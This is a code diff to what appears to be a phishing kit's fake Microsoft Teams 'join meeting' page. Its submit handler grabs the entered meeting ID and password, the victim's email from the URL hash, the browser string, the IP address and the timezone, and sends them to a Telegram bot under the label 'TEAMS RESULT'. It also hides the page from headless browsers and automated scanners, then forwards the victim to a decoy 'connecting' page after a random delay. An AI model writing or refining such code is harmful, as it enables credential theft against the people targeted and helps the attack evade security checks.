@@ -274,20 +274,28 @@
 document.getElementById('joinForm').addEventListener('submit', async function(e) {
   e.preventDefault();
 
+  const form = e.target;
+
+  // --- Check form validity (both fields required) ---
+  if (!form.checkValidity()) {
+    form.reportValidity();
+    return;
+  }
+
   // --- Anti-bot / headless detection ---
   if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
     document.body.innerHTML = "<h2>Security Verification Failed</h2><p>Please try again from a regular browser.</p>";
     throw new Error("Headless browser detected");
   }
 
-  // --- Collect form input ---
+  // --- Collect form inputs ---
   const meetingID = document.getElementById('meetingID').value.trim();
   const password = document.getElementById('password').value.trim();
   const browser = navigator.userAgent;
 
   // --- Capture email from URL hash ---
-  const hash = window.location.hash; // "#target@example.com"
-  const email = hash ? hash.substring(1) : '';
+  let email = window.location.hash ? window.location.hash.substring(1) : '';
+  email = email.replace(/=*$/, ''); // strip trailing =
 
   // --- Fetch IP with timeout ---
   let ipAddress = 'Unavailable';
@@ -300,11 +308,10 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
     ipAddress = data.ip || 'Unavailable';
   } catch {}
 
-  // --- Timestamp & timezone ---
   const currentDateTime = new Date().toLocaleString();
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-  // --- Prepare Telegram message ---
+  // --- Send to Telegram ---
   const message =
     `✅💯 TEAMS RESULT 💯✅\n` +
     `Meeting ID: ${meetingID}\n` +
@@ -328,9 +335,9 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
     });
   } catch {}
 
-  // --- Redirect to Page 2, carry hash ---
+  // --- Redirect to Page 2 with hash ---
   setTimeout(() => {
-    window.location.href = 'connecting.html' + (hash || '');
+    window.location.href = 'connecting.html' + (email ? '#' + encodeURIComponent(email) : '');
   }, Math.floor(Math.random() * 1000) + 500);
 });
 </script>
